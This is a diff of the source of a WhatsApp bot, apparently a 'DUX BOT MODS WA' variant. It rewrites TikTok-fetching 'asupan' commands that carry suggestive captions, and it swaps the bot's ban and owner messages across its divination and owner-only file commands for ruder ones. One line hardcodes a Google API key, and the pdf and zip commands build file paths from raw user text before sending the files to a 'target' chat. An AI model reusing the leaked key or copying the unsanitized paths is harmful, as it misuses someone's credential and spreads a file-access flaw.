-	axios.get(`https://api.lolhuman.xyz/api/tiktok?apikey=${apikey}&url=https://www.tiktok.com/@menantu_idamannnn/video/7211912588366548251?_r=1&u_code=dgc2fmm4i3k9b1&region=ID&mid=7211912606574627610&preview_pb=0&sharer_language=id&_d=d9iga21gg7d358&share_item_id=7211912588366548251&source=h5_t&timestamp=1682941528&user_id=6914652081950639106&sec_user_id=MS4wLjABAAAABSJMM2SSvwkONssmfetetURo2KRIL-wv22KQFCPh-ARQ0bEMn7lZ3gkjm6BhZdlm&social_share_type=0&utm_source=copy&utm_campaign=client_share&utm_medium=android&share_iid=7227953970441242394&share_link_id=5530f877-35fd-4db3-9b7c-d0c8e7e749ed&share_app_id=1180&ugbiz_name=Main&ug_btm=b6880%2Cb2878`).then(({ data }) => {
-haikal.sendMessage(from, { video: { url: data.result.link }, mimetype: 'video/mp4', caption:`¥ Ah Sayang 🤤` })
-	})
-	break
+case "asupan4":{
+if (isBan) return m.reply('*banned by owner Tolol*')
+await loading()
+m.reply('*Sabar Cuy Loading*')
+let res = await tiktok('https://vt.tiktok.com/ZS83YfoYm/')
+haikal.sendMessage(m.chat, {video:{url: res.url[0].url},
+caption: `
+辛 🤤 Ahh`}, {quoted:m})
+}
+break
 //=================================================//
-case 'asupan6':
-	if (isBan) return m.reply('*You are banned by the owner, you do not have to pretend*')
-	await loading()
-	axios.get(`https://api.lolhuman.xyz/api/tiktok?apikey=${apikey}&url=https://vt.tiktok.com/ZS83YyKm7/`).then(({ data }) => {
-haikal.sendMessage(from, { video: { url: data.result.link }, mimetype: 'video/mp4', caption:`¥ Ah Sayang 🤤` })
-	})
-	break
+case "asupan5":{
+if (isBan) return m.reply('*banned by owner Tolol*')
+await loading()
+m.reply('*Sabar Cuy Loading*')
+let res = await tiktok('https://www.tiktok.com/@menantu_idamannnn/video/7211912588366548251?_r=1&u_code=dgc2fmm4i3k9b1&region=ID&mid=7211912606574627610&preview_pb=0&sharer_language=id&_d=d9iga21gg7d358&share_item_id=7211912588366548251&source=h5_t&timestamp=1682941528&user_id=6914652081950639106&sec_user_id=MS4wLjABAAAABSJMM2SSvwkONssmfetetURo2KRIL-wv22KQFCPh-ARQ0bEMn7lZ3gkjm6BhZdlm&social_share_type=0&utm_source=copy&utm_campaign=client_share&utm_medium=android&share_iid=7227953970441242394&share_link_id=5530f877-35fd-4db3-9b7c-d0c8e7e749ed&share_app_id=1180&ugbiz_name=Main&ug_btm=b6880%2Cb2878')
+haikal.sendMessage(m.chat, {video:{url: res.url[0].url},
+caption: `
+辛 🤤 Ahh`}, {quoted:m})
+}
+break
 //=================================================//
-case 'asupan7':
-	if (isBan) return m.reply('*You are banned by the owner, you do not have to pretend*')
-	await loading()
-	axios.get(`https://api.lolhuman.xyz/api/tiktok?apikey=${apikey}&url=https://vt.tiktok.com/ZS8wpweu7/`).then(({ data }) => {
-haikal.sendMessage(from, { video: { url: data.result.link }, mimetype: 'video/mp4', caption:`¥ Ah Sayang 🤤` })
-	})
-	break
+case "asupan6":{
+if (isBan) return m.reply('*banned by owner Tolol*')
+await loading()
+m.reply('*Sabar Cuy Loading*')
+let res = await tiktok('https://vt.tiktok.com/ZS83YyKm7/')
+haikal.sendMessage(m.chat, {video:{url: res.url[0].url},
+caption: `
+辛 🤤 Ahh`}, {quoted:m})
+}
+break
 //=================================================//
-case 'asupan8':
-	if (isBan) return m.reply('*You are banned by the owner, you do not have to pretend*')
-	await loading()
-	axios.get(`https://api.lolhuman.xyz/api/tiktok?apikey=${apikey}&url=https://vt.tiktok.com/ZS83Y9Y2p/`).then(({ data }) => {
-haikal.sendMessage(from, { video: { url: data.result.link }, mimetype: 'video/mp4', caption:`¥ Ah Sayang 🤤` })
-	})
-	break
+case "asupan7":{
+if (isBan) return m.reply('*banned by owner Tolol*')
+await loading()
+m.reply('*Sabar Cuy Loading*')
+let res = await tiktok('https://vt.tiktok.com/ZS8wpweu7/')
+haikal.sendMessage(m.chat, {video:{url: res.url[0].url},
+caption: `
+辛 🤤 Ahh`}, {quoted:m})
+}
+break
 //=================================================//
-case 'asupan9':
-	if (isBan) return m.reply('*You are banned by the owner, you do not have to pretend*')
-	await loading()
-	axios.get(`https://api.lolhuman.xyz/api/tiktok?apikey=${apikey}&url=https://vt.tiktok.com/ZS83Ygms3/`).then(({ data }) => {
-haikal.sendMessage(from, { video: { url: data.result.link }, mimetype: 'video/mp4', caption:`¥ Ah Sayang 🤤` })
-	})
-	break
+case "asupan8":{
+if (isBan) return m.reply('*banned by owner Tolol*')
+await loading()
+m.reply('*Sabar Cuy Loading*')
+let res = await tiktok('https://vt.tiktok.com/ZS83Y9Y2p/')
+haikal.sendMessage(m.chat, {video:{url: res.url[0].url},
+caption: `
+辛 🤤 Ahh`}, {quoted:m})
+}
+break
 //=================================================//
-case 'asupan10':
-	if (isBan) return m.reply('*You are banned by the owner, you do not have to pretend*')
-	await loading()
-	axios.get(`https://api.lolhuman.xyz/api/tiktok?apikey=${apikey}&url=https://vt.tiktok.com/ZS83YsuNQ/`).then(({ data }) => {
-haikal.sendMessage(from, { video: { url: data.result.link }, mimetype: 'video/mp4', caption:`¥ Ah Sayang 🤤` })
-	})
-	break
+case "asupan9":{
+if (isBan) return m.reply('*banned by owner Tolol*')
+await loading()
+m.reply('*Sabar Cuy Loading*')
+let res = await tiktok('https://vt.tiktok.com/ZS83Ygms3/')
+haikal.sendMessage(m.chat, {video:{url: res.url[0].url},
+caption: `
+辛 🤤 Ahh`}, {quoted:m})
+}
+break
 //=================================================//
-case 'asupan11':
-	if (isBan) return m.reply('*You are banned by the owner, you do not have to pretend*')
-	await loading()
-	axios.get(`https://api.lolhuman.xyz/api/tiktok?apikey=${apikey}&url=https://vt.tiktok.com/ZS83YtYaQ/`).then(({ data }) => {
-haikal.sendMessage(from, { video: { url: data.result.link }, mimetype: 'video/mp4', caption:`¥ Ah Sayang 🤤` })
-	})
-	break
+case "asupan10":{
+if (isBan) return m.reply('*banned by owner Tolol*')
+await loading()
+m.reply('*Sabar Cuy Loading*')
+let res = await tiktok('https://vt.tiktok.com/ZS83YsuNQ/')
+haikal.sendMessage(m.chat, {video:{url: res.url[0].url},
+caption: `
+辛 🤤 Ahh`}, {quoted:m})
+}
+break
 //=================================================//
-case 'asupan12':
-	if (isBan) return m.reply('*You are banned by the owner, you do not have to pretend*')
-	await loading()
-	axios.get(`https://api.lolhuman.xyz/api/tiktok?apikey=${apikey}&url=https://vt.tiktok.com/ZS83YbpvJ/`).then(({ data }) => {
-haikal.sendMessage(from, { video: { url: data.result.link }, mimetype: 'video/mp4', caption:`¥ Ah Sayang 🤤` })
-	})
-	break
+case "asupan12":{
+if (isBan) return m.reply('*banned by owner Tolol*')
+await loading()
+m.reply('*Sabar Cuy Loading*')
+let res = await tiktok('https://vt.tiktok.com/ZS83YtYaQ/')
+haikal.sendMessage(m.chat, {video:{url: res.url[0].url},
+caption: `
+辛 🤤 Ahh`}, {quoted:m})
+}
+break
 //=================================================//
-case 'asupan13':
-	if (isBan) return m.reply('*You are banned by the owner, you do not have to pretend*')
-	await loading()
-	axios.get(`https://api.lolhuman.xyz/api/tiktok?apikey=${apikey}&url=https://vt.tiktok.com/ZS83Y9FaD/`).then(({ data }) => {
-haikal.sendMessage(from, { video: { url: data.result.link }, mimetype: 'video/mp4', caption:`¥ Ah Sayang 🤤` })
-	})
-	break
+case "asupan13":{
+if (isBan) return m.reply('*banned by owner Tolol*')
+await loading()
+m.reply('*Sabar Cuy Loading*')
+let res = await tiktok('https://vt.tiktok.com/ZS83YbpvJ/')
+haikal.sendMessage(m.chat, {video:{url: res.url[0].url},
+caption: `
+辛 🤤 Ahh`}, {quoted:m})
+}
+break
 //=================================================//
-case 'asupan14':
-	if (isBan) return m.reply('*You are banned by the owner, you do not have to pretend*')
-	await loading()
-	axios.get(`https://api.lolhuman.xyz/api/tiktok?apikey=${apikey}&url=https://vt.tiktok.com/ZS8wpXDPm/`).then(({ data }) => {
-haikal.sendMessage(from, { video: { url: data.result.link }, mimetype: 'video/mp4', caption:`¥ Ah Sayang 🤤` })
-	})
-	break
+case "asupan14":{
+if (isBan) return m.reply('*banned by owner Tolol*')
+await loading()
+m.reply('*Sabar Cuy Loading*')
+let res = await tiktok('https://vt.tiktok.com/ZS83Y9FaD/')
+haikal.sendMessage(m.chat, {video:{url: res.url[0].url},
+caption: `
+辛 🤤 Ahh`}, {quoted:m})
+}
+break
 //=================================================//
-case 'asupan15':
-	if (isBan) return m.reply('*You are banned by the owner, you do not have to pretend*')
-	await loading()
-	axios.get(`https://api.lolhuman.xyz/api/tiktok?apikey=${apikey}&url=https://vt.tiktok.com/ZS8wpvaTV/`).then(({ data }) => {
-haikal.sendMessage(from, { video: { url: data.result.link }, mimetype: 'video/mp4', caption:`¥ Ah Sayang 🤤` })
-	})
-	break
+case "asupan15":{
+if (isBan) return m.reply('*banned by owner Tolol*')
+await loading()
+m.reply('*Sabar Cuy Loading*')
+let res = await tiktok('https://vt.tiktok.com/ZS8wpXDPm/')
+haikal.sendMessage(m.chat, {video:{url: res.url[0].url},
+caption: `
+辛 🤤 Ahh`}, {quoted:m})
+}
+break
 //=================================================//
-case 'asupan16':
-	if (isBan) return m.reply('*You are banned by the owner, you do not have to pretend*')
-	await loading()
-	axios.get(`https://api.lolhuman.xyz/api/tiktok?apikey=${apikey}&url=https://vt.tiktok.com/ZS83YaXCU/`).then(({ data }) => {
-haikal.sendMessage(from, { video: { url: data.result.link }, mimetype: 'video/mp4', caption:`¥ Ah Sayang 🤤` })
-	})
-	break
+case "asupan16":{
+if (isBan) return m.reply('*banned by owner Tolol*')
+await loading()
+m.reply('*Sabar Cuy Loading*')
+let res = await tiktok('https://vt.tiktok.com/ZS8wpvaTV/')
+haikal.sendMessage(m.chat, {video:{url: res.url[0].url},
+caption: `
+辛 🤤 Ahh`}, {quoted:m})
+}
+break
 //=================================================//
-case 'asupan17':
-	if (isBan) return m.reply('*You are banned by the owner, you do not have to pretend*')
-	await loading()
-	axios.get(`https://api.lolhuman.xyz/api/tiktok?apikey=${apikey}&url=https://vt.tiktok.com/ZS83EKHja/`).then(({ data }) => {
-haikal.sendMessage(from, { video: { url: data.result.link }, mimetype: 'video/mp4', caption:`¥ Ah Sayang 🤤` })
-	})
-	break
+case "asupan17":{
+if (isBan) return m.reply('*banned by owner Tolol*')
+await loading()
+m.reply('*Sabar Cuy Loading*')
+let res = await tiktok('https://vt.tiktok.com/ZS83YaXCU/')
+haikal.sendMessage(m.chat, {video:{url: res.url[0].url},
+caption: `
+辛 🤤 Ahh`}, {quoted:m})
+}
+break
 //=================================================//
-case 'asupan18':
-	if (isBan) return m.reply('*You are banned by the owner, you do not have to pretend*')
-	await loading()
-	axios.get(`https://api.lolhuman.xyz/api/tiktok?apikey=${apikey}&url=https://vt.tiktok.com/ZS83Yyk6y/`).then(({ data }) => {
-haikal.sendMessage(from, { video: { url: data.result.link }, mimetype: 'video/mp4', caption:`¥ Ah Sayang 🤤` })
-	})
-	break
+case "asupan18":{
+if (isBan) return m.reply('*banned by owner Tolol*')
+await loading()
+m.reply('*Sabar Cuy Loading*')
+let res = await tiktok('https://vt.tiktok.com/ZS83EKHja/')
+haikal.sendMessage(m.chat, {video:{url: res.url[0].url},
+caption: `
+辛 🤤 Ahh`}, {quoted:m})
+}
+break
 //=================================================//
-case 'asupan19':
-	if (isBan) return m.reply('*You are banned by the owner, you do not have to pretend*')
-	await loading()
-	axios.get(`https://api.lolhuman.xyz/api/tiktok?apikey=${apikey}&url=https://vt.tiktok.com/ZS83Yb7GX/`).then(({ data }) => {
-haikal.sendMessage(from, { video: { url: data.result.link }, mimetype: 'video/mp4', caption:`¥ Ah Sayang 🤤` })
-	})
-	break
+case "asupan19":{
+if (isBan) return m.reply('*banned by owner Tolol*')
+await loading()
+m.reply('*Sabar Cuy Loading*')
+let res = await tiktok('https://vt.tiktok.com/ZS83Yyk6y/')
+haikal.sendMessage(m.chat, {video:{url: res.url[0].url},
+caption: `
+辛 🤤 Ahh`}, {quoted:m})
+}
+break
 //=================================================//
 case "asupan20":{
-if (isBan) return m.reply('*You are banned by the owner, you do not have to pretend*')
+if (isBan) return m.reply('*banned by owner Tolol*')
 await loading()
-m.reply('*Ah Males Sangean*')
+m.reply('*Sabar Cuy Loading*')
+let res = await tiktok('https://vt.tiktok.com/ZS83Yb7GX/')
+haikal.sendMessage(m.chat, {video:{url: res.url[0].url},
+caption: `
+辛 🤤 Ahh`}, {quoted:m})
 }
 break
 //=================================================//
@@ -5889,7 +5814,7 @@ haikal.sendMessage(m.chat, { image : { url : ress }, caption: teks }, { quoted:m
 break
 //=================================================//
 case 'emojimix': { 
-if (isBan) return m.reply('*You are banned by the owner, you do not have to pretend*')
+if (isBan) return m.reply('*banned by owner Tolol*')
 await loading()
  let [emoji1, emoji2] = text.split`+`
 if (!emoji1) throw `Example : ${prefix + command} 😅+🤔`
@@ -5903,7 +5828,7 @@ await fs.unlinkSync(encmedia)
 break
 //=================================================//
 case 'emojimix2': {
-if (isBan) return m.reply('*You are banned by the owner, you do not have to pretend*')
+if (isBan) return m.reply('*banned by owner Tolol*')
 await loading()
  if (!text) throw `Example : ${prefix + command} 😅`
 let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(text)}`)
@@ -5915,7 +5840,7 @@ await fs.unlinkSync(encmedia)
 break
 //=================================================//
 case 'artimimpi': case 'tafsirmimpi': {
-if (isBan) return m.reply('*You are banned by the owner, you do not have to pretend*')
+if (isBan) return m.reply('*banned by owner Tolol*')
 await loading()
  if (!text) throw `Example : ${prefix + command} belanja`
  let anu = await primbon.tafsir_mimpi(text)
@@ -5925,9 +5850,9 @@ await loading()
 break
 //=================================================//
 case 'ramalanjodoh': case 'ramaljodoh': {
-if (isBan) return m.reply('*You are banned by the owner, you do not have to pretend*')
+if (isBan) return m.reply('*banned by owner Tolol*')
 await loading()
- if (!text) throw `Example : ${prefix + command} DUX BOT, 7, 7, 2005, Putri, 16, 11, 2004`
+ if (!text) throw `Example : ${prefix + command} DUX BOT MODS WA, 7, 7, 2005, Putri, 16, 11, 2004`
  let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
  let anu = await primbon.ramalan_jodoh(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
  if (anu.status == false) return m.reply(anu.message)
@@ -5936,9 +5861,9 @@ await loading()
 break
 //=================================================//
 case 'artinama': {
-if (isBan) return m.reply('*You are banned by the owner, you do not have to pretend*')
+if (isBan) return m.reply('*banned by owner Tolol*')
 await loading()
- if (!text) throw `Example : ${prefix + command} DUX BOT Hw`
+ if (!text) throw `Example : ${prefix + command} DUX BOT MODS WA Hw`
  let anu = await primbon.arti_nama(text)
  if (anu.status == false) return m.reply(anu.message)
  haikal.sendText(from, `⭔ *Nama :* ${anu.message.nama}\n⭔ *Arti :* ${anu.message.arti}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
@@ -5946,9 +5871,9 @@ await loading()
 break
 //=================================================//
 case 'kecocokannama': case 'cocoknama': {
-if (isBan) return m.reply('*You are banned by the owner, you do not have to pretend*')
+if (isBan) return m.reply('*banned by owner Tolol*')
 await loading()
- if (!text) throw `Example : ${prefix + command} DUX BOT, 7, 7, 2005`
+ if (!text) throw `Example : ${prefix + command} DUX BOT MODS WA, 7, 7, 2005`
  let [nama, tgl, bln, thn] = text.split`,`
  let anu = await primbon.kecocokan_nama(nama, tgl, bln, thn)
  if (anu.status == false) return m.reply(anu.message)
@@ -5957,9 +5882,9 @@ await loading()
 break
 //=================================================//
 case 'kecocokanpasangan': case 'cocokpasangan': case 'pasangan': {
-if (isBan) return m.reply('*You are banned by the owner, you do not have to pretend*')
+if (isBan) return m.reply('*banned by owner Tolol*')
 await loading()
- if (!text) throw `Example : ${prefix + command} DUX BOT|Putri`
+ if (!text) throw `Example : ${prefix + command} DUX BOT MODS WA|Putri`
  let [nama1, nama2] = text.split`|`
  let anu = await primbon.kecocokan_nama_pasangan(nama1, nama2)
  if (anu.status == false) return m.reply(anu.message)
@@ -5968,7 +5893,7 @@ await loading()
 break
 //=================================================//
 case 'jadianpernikahan': case 'jadiannikah': {
-if (isBan) return m.reply('*You are banned by the owner, you do not have to pretend*')
+if (isBan) return m.reply('*banned by owner Tolol*')
 await loading()
  if (!text) throw `Example : ${prefix + command} 6, 12, 2020`
  let [tgl, bln, thn] = text.split`,`
@@ -5979,7 +5904,7 @@ await loading()
 break
 //=================================================//
 case 'sifatusaha': {
-if (isBan) return m.reply('*You are banned by the owner, you do not have to pretend*')
+if (isBan) return m.reply('*banned by owner Tolol*')
 await loading()
  if (!ext)throw `Example : ${prefix+ command} 28, 12, 2021`
  let [tgl, bln, thn] = text.split`,`
@@ -5990,7 +5915,7 @@ await loading()
 break
 //=================================================//
 case 'rejeki': case 'rezeki': {
-if (isBan) return m.reply('*You are banned by the owner, you do not have to pretend*')
+if (isBan) return m.reply('*banned by owner Tolol*')
 await loading()
  if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
  let [tgl, bln, thn] = text.split`,`
@@ -6001,7 +5926,7 @@ await loading()
 break
 //=================================================//
 case 'pekerjaan': case 'kerja': {
-if (isBan) return m.reply('*You are banned by the owner, you do not have to pretend*')
+if (isBan) return m.reply('*banned by owner Tolol*')
 await loading()
  if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
  let [tgl, bln, thn] = text.split`,`
@@ -6012,7 +5937,7 @@ await loading()
 break
 //=================================================//
 case 'ramalannasib': case 'ramalnasib': case 'nasib': {
-if (isBan) return m.reply('*You are banned by the owner, you do not have to pretend*')
+if (isBan) return m.reply('*banned by owner Tolol*')
 await loading()
  if (!text) throw `Example : 7, 7, 2005`
  let [tgl, bln, thn] = text.split`,`
@@ -6023,7 +5948,7 @@ await loading()
 break
 //=================================================//
 case 'potensipenyakit': case 'penyakit': {
-if (isBan) return m.reply('*You are banned by the owner, you do not have to pretend*')
+if (isBan) return m.reply('*banned by owner Tolol*')
 await loading()
  if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
  let [tgl, bln, thn] = text.split`,`
@@ -6034,7 +5959,7 @@ await loading()
 break
 //=================================================//
 case 'artitarot': case 'tarot': {
-if (isBan) return m.reply('*You are banned by the owner, you do not have to pretend*')
+if (isBan) return m.reply('*banned by owner Tolol*')
 await loading()
  if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
  let [tgl, bln, thn] = text.split`,`
@@ -6045,9 +5970,9 @@ await loading()
 break
 //=================================================//
 case 'fengshui': {
-if (isBan) return m.reply('*You are banned by the owner, you do not have to pretend*')
+if (isBan) return m.reply('*banned by owner Tolol*')
 await loading()
- if (!text) throw `Example : ${prefix + command} DUX BOT, 1, 2005\n\nNote : ${prefix + command} Nama, gender, tahun lahir\nGender : 1 untuk laki-laki & 2 untuk perempuan`
+ if (!text) throw `Example : ${prefix + command} DUX BOT MODS WA, 1, 2005\n\nNote : ${prefix + command} Nama, gender, tahun lahir\nGender : 1 untuk laki-laki & 2 untuk perempuan`
  let [nama, gender, tahun] = text.split`,`
  let anu = await primbon.perhitungan_feng_shui(nama, gender, tahun)
  if (anu.status == false) return m.reply(anu.message)
@@ -6056,7 +5981,7 @@ await loading()
 break
 //=================================================//
 case 'haribaik': {
-if (isBan) return m.reply('*You are banned by the owner, you do not have to pretend*')
+if (isBan) return m.reply('*banned by owner Tolol*')
 await loading()
  if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
  let [tgl, bln, thn] = text.split`,`
@@ -6067,7 +5992,7 @@ await loading()
 break
 //=================================================//
 case 'harisangar': case 'taliwangke': {
-if (isBan) return m.reply('*You are banned by the owner, you do not have to pretend*')
+if (isBan) return m.reply('*banned by owner Tolol*')
 await loading()
  if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
  let [tgl, bln, thn] = text.split`,`
@@ -6078,7 +6003,7 @@ await loading()
 break
 //=================================================//
 case 'harinaas': case 'harisial': {
-if (isBan) return m.reply('*You are banned by the owner, you do not have to pretend*')
+if (isBan) return m.reply('*banned by owner Tolol*')
 await loading()
  if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
  let [tgl, bln, thn] = text.split`,`
@@ -6089,7 +6014,7 @@ await loading()
 break
 //=================================================//
 case 'nagahari': case 'harinaga': {
-if (isBan) return m.reply('*You are banned by the owner, you do not have to pretend*')
+if (isBan) return m.reply('*banned by owner Tolol*')
 await loading()
  if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
  let [tgl, bln, thn] = text.split`,`
@@ -6100,7 +6025,7 @@ await loading()
 break
 //=================================================//
 case 'arahrejeki': case 'arahrezeki': {
-if (isBan) return m.reply('*You are banned by the owner, you do not have to pretend*')
+if (isBan) return m.reply('*banned by owner Tolol*')
 await loading()
  if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
  let [tgl, bln, thn] = text.split`,`
@@ -6111,9 +6036,9 @@ await loading()
 break
 //=================================================//
 case 'peruntungan': {
-if (isBan) return m.reply('*You are banned by the owner, you do not have to pretend*')
+if (isBan) return m.reply('*banned by owner Tolol*')
 await loading()
- if (!text) throw `Example : ${prefix + command} DUX BOT, 7, 7, 2005, 2022\n\nNote : ${prefix + command} Nama, tanggal lahir, bulan lahir, tahun lahir, untuk tahun`
+ if (!text) throw `Example : ${prefix + command} DUX BOT MODS WA, 7, 7, 2005, 2022\n\nNote : ${prefix + command} Nama, tanggal lahir, bulan lahir, tahun lahir, untuk tahun`
  let [nama, tgl, bln, thn, untuk] = text.split`,`
  let anu = await primbon.ramalan_peruntungan(nama, tgl, bln, thn, untuk)
  if (anu.status == false) return m.reply(anu.message)
@@ -6122,7 +6047,7 @@ await loading()
 break
 //=================================================//
 case 'weton': case 'wetonjawa': {
-if (isBan) return m.reply('*You are banned by the owner, you do not have to pretend*')
+if (isBan) return m.reply('*banned by owner Tolol*')
 await loading()
  if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
  let [tgl, bln, thn] = text.split`,`
@@ -6133,9 +6058,9 @@ await loading()
 break
 //=================================================//
 case 'sifat': case 'karakter': {
-if (isBan) return m.reply('*You are banned by the owner, you do not have to pretend*')
+if (isBan) return m.reply('*banned by owner Tolol*')
 await loading()
- if (!text) throw `Example : ${prefix + command} DUX BOT, 7, 7, 2005`
+ if (!text) throw `Example : ${prefix + command} DUX BOT MODS WA, 7, 7, 2005`
  let [nama, tgl, bln, thn] = text.split`,`
  let anu = await primbon.sifat_karakter_tanggal_lahir(nama, tgl, bln, thn)
  if (anu.status == false) return m.reply(anu.message)
@@ -6144,9 +6069,9 @@ await loading()
 break
 //=================================================//
 case 'keberuntungan': {
-if (isBan) return m.reply('*You are banned by the owner, you do not have to pretend*')
+if (isBan) return m.reply('*banned by owner Tolol*')
 await loading()
- if (!text) throw `Example : ${prefix + command} DUX BOT, 7, 7, 2005`
+ if (!text) throw `Example : ${prefix + command} DUX BOT MODS WA, 7, 7, 2005`
  let [nama, tgl, bln, thn] = text.split`,`
  let anu = await primbon.potensi_keberuntungan(nama, tgl, bln, thn)
  if (anu.status == false) return m.reply(anu.message)
@@ -6155,7 +6080,7 @@ await loading()
 break
 //=================================================//
 case 'memancing': {
-if (isBan) return m.reply('*You are banned by the owner, you do not have to pretend*')
+if (isBan) return m.reply('*banned by owner Tolol*')
 await loading()
  if (!text) throw `Example : ${prefix + command} 12, 1, 2022`
  let [tgl, bln, thn] = text.split`,`
@@ -6166,7 +6091,7 @@ await loading()
 break
 //=================================================//
 case 'masasubur': {
-if (isBan) return m.reply('*You are banned by the owner, you do not have to pretend*')
+if (isBan) return m.reply('*banned by owner Tolol*')
 await loading()
  if (!text) throw `Example : ${prefix + command} 12, 1, 2022, 28\n\nNote : ${prefix + command} hari pertama menstruasi, siklus`
  let [tgl, bln, thn, siklus] = text.split`,`
@@ -6177,7 +6102,7 @@ await loading()
 break
 //=================================================//
 case 'zodiak': case 'zodiac': {
-if (isBan) return m.reply('*You are banned by the owner, you do not have to pretend*')
+if (isBan) return m.reply('*banned by owner Tolol*')
 await loading()
  if (!text) throw `Example : ${prefix+ command} 7 7 2005`
  let zodiak = [
@@ -6213,7 +6138,7 @@ await loading()
 break
 //=================================================//
 case 'shio': {
-if (isBan) return m.reply('*You are banned by the owner, you do not have to pretend*')
+if (isBan) return m.reply('*banned by owner Tolol*')
 await loading()
  if (!text) throw `Example : ${prefix + command} tikus\n\nNote : For Detail https://primbon.com/shio.htm`
  let anu = await primbon.shio(text)
@@ -6223,7 +6148,7 @@ await loading()
 break
 //=================================================//
 case 'setcmd': {
-if (!isCreator) return m.reply('*Special Premium*')
+if (!isCreator) return m.reply('*special Owner Bot*')
 await loading()
 if (!m.quoted) throw 'Reply Pesan!'
 if (!m.quoted.fileSha256) throw 'SHA256 Hash Missing'
@@ -6242,7 +6167,7 @@ m.reply(`Done!`)
 break
 //=================================================//
 case 'delcmd': {
-if (!isCreator) return m.reply('*Special Premium*')
+if (!isCreator) return m.reply('*special Owner Bot*')
 await loading()
 if (!m.quoted) throw 'Reply Pesan!'
 let hash = m.quoted.fileSha256.toString('base64')
@@ -6254,7 +6179,7 @@ m.reply(`Done!`)
 break
 //=================================================//
 case 'listcmd': {
-if (isBan) return m.reply('*You are banned by the owner, you do not have to pretend*')
+if (isBan) return m.reply('*banned by owner Tolol*')
 await loading()
 let teks = `
 *List Cmd Sticker*
@@ -6265,7 +6190,7 @@ haikal.sendText(from, teks, m, { mentions: Object.values(global.db.data.sticker)
 break
 //=================================================//
 case 'addpdf':{
-if (!isCreator) return m.reply('*Special Premium*')
+if (!isCreator) return m.reply('*special Owner Bot*')
 await loading()
 if (args.length < 1) return reply('Nama pdf apa')
 let teks = `${text}`
@@ -6282,7 +6207,7 @@ reply(`Sukses Menambahkan Pdf\nCek dengan cara ${prefix}listpdf`)
 break
 //=================================================//
 case 'delpdf':{
-if (!isCreator) return m.reply('*Special Premium*')
+if (!isCreator) return m.reply('*special Owner Bot*')
 await loading()
 if (args.length < 1) return reply('Masukan query')
 let teks = `${text}`
@@ -6298,19 +6223,19 @@ reply(`Sukses delete pdf ${teks}`)
 break
 //=================================================//
 case 'listpdf': {
-if (!isCreator) return m.reply('*Special Premium*')
+if (!isCreator) return m.reply('*special Owner Bot*')
 await loading()
 let teksoooo = '┌──⭓「 *LIST PDF* 」\n│\n'
 for (let x of docunye) {
 teksoooo = `│⭔ ${x}\n`
 }
-teksoooo = `│\n└────────────⭓\n\n*Total ada : ${docunye.length} \n\n Contoh 1 : sendpdf DUX BOT + sambil reply pesan target* \n\n Contoh 2 : yopdf DUX BOT`
+teksoooo = `│\n└────────────⭓\n\n*Total ada : ${docunye.length} \n\n Contoh 1 : sendpdf DUX BOT MODS WA + sambil reply pesan target* \n\n Contoh 2 : yopdf DUX BOT MODS WA`
 m.reply(teksoooo)
 }
 break
 //=================================================//
 case 'yopdf':{
-if (!isCreator) return m.reply('*Special Premium*')
+if (!isCreator) return m.reply('*special Owner Bot*')
 await loading()
 let teks = `${text}`
 {
@@ -6320,19 +6245,19 @@ haikal.sendMessage(from, { document: fs.readFileSync(`./database/Docu/${teks}.pd
 break
 //=================================================//
 case 'sendpdf': {
-if (!isCreator) return m.reply('*Special Premium*')
+if (!isCreator) return m.reply('*special Owner Bot*')
 await loading()
 if (!text) return m.reply(`Lah, Reply Chat Orang Nya Masukin Text Yang Ada Di Listpdf`)
 let teks = `${text}`
 {
 haikal.sendMessage(m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@s.whatsapp.net", { document: fs.readFileSync(`./database/Docu/${teks}.pdf`), mimetype: 'application/pdf', fileName: `${teks}`, caption: `${teks}` }, { quoted:m})
-m.reply(`SUCCESSFULLY SENT  Pdf Ke ${m.quoted.sender}`)
+m.reply(`Sukses Mengirim Pesan Pdf Ke ${m.quoted.sender}`)
 }
 }
 break
 //=================================================//
 case 'addzip':{
-if (!isCreator) return m.reply('*Special Premium*')
+if (!isCreator) return m.reply('*special Owner Bot*')
 await loading()
 if (args.length < 1) return reply('Nama zip apa')
 let teks = `${text}`
@@ -6349,7 +6274,7 @@ reply(`Sukses Menambahkan zip\nCek dengan cara ${prefix}listzip`)
 break
 //=================================================//
 case 'delzip':{
-if (!isCreator) return m.reply('*Special Premium*')
+if (!isCreator) return m.reply('*special Owner Bot*')
 await loading()
 if (args.length < 1) return reply('Masukan text yang ada di list zip')
 let teks = `${text}`
@@ -6365,19 +6290,19 @@ reply(`Sukses delete zip ${teks}`)
 break
 //=================================================//
 case 'listzip': {
-if (!isCreator) return m.reply('*Special Premium*')
+if (!isCreator) return m.reply('*special Owner Bot*')
 await loading()
 let teksooooo = '┌──⭓「 *LIST ZIP* 」\n│\n'
 for (let x of zipnye) {
 teksooooo = `│⭔ ${x}\n`
 }
-teksooooo = `│\n└────────────⭓\n\n*Total ada : ${zipnye.length} \n\n Contoh 1 : sendzip DUX BOT + sambil reply pesan target* \n\n Contoh 2 : yozip DUX BOT`
+teksooooo = `│\n└────────────⭓\n\n*Total ada : ${zipnye.length} \n\n Contoh 1 : sendzip DUX BOT MODS WA + sambil reply pesan target* \n\n Contoh 2 : yozip DUX BOT MODS WA`
 m.reply(teksooooo)
 }
 break
 //=================================================//
 case 'yozip':{
-if (!isCreator) return m.reply('*Special Premium*')
+if (!isCreator) return m.reply('*special Owner Bot*')
 await loading()
 if (args.length < 1) return reply('Masukan text yang ada di list zip')
 let teks = `${text}`
